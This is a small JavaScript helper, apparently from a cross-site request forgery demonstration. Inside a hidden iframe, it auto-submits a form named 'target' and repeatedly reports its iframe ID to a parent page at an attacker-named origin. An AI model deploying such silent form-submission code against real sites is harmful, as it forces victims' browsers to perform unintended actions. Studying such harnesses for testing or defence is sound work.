if(!IFRAME_ID) { console.log("Warning! No iframe id set."); var IFRAME_ID = ""; }
var IFRAME_POSTER = {};
IFRAME_POSTER.havePosted = false;
IFRAME_POSTER.reportAndPost = function() {
    if(parent != undefined) {
        parent.postMessage(IFRAME_ID, "https://attackr.se:8444");
    }
    if(!IFRAME_POSTER.havePosted) {
        document.forms['target'].submit();
        IFRAME_POSTER.havePosted = true;
    }
};
IFRAME_POSTER.onLoad = function() {
    setInterval(IFRAME_POSTER.reportAndPost, 1000);
};
